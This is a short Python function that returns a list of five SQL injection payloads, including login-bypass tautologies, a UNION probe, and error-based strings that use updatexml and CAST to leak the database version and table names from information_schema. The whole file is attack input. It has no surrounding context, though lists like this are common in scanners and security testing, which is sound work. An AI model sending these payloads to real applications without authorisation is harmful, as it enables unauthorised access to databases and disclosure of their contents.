def generate_sqli_payloads():
    return [
        "' OR '1'='1' --",
        "' UNION SELECT null, null --",
        "' AND updatexml(1,concat(0x7e,(select version())),0) --",
        "' OR 1=1 LIMIT 1 OFFSET 0 --",
        "' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT) --"
    ]
